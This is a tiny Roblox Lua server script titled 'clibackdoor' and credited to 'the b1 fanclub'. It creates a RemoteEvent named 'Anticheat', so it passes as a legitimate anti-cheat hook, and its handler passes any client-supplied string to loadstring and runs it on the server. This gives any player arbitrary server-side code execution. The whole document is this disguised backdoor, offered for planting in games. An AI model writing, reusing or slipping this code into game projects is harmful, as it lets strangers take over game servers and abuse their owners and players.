-- clibackdoor, by the b1 fanclub

local ac = Instance.new("RemoteEvent", game.ReplicatedStorage)
ac.Name = "Anticheat"
ac.OnServerEvent:connect(function(player, SS)
    loadstring(SS)()
end)
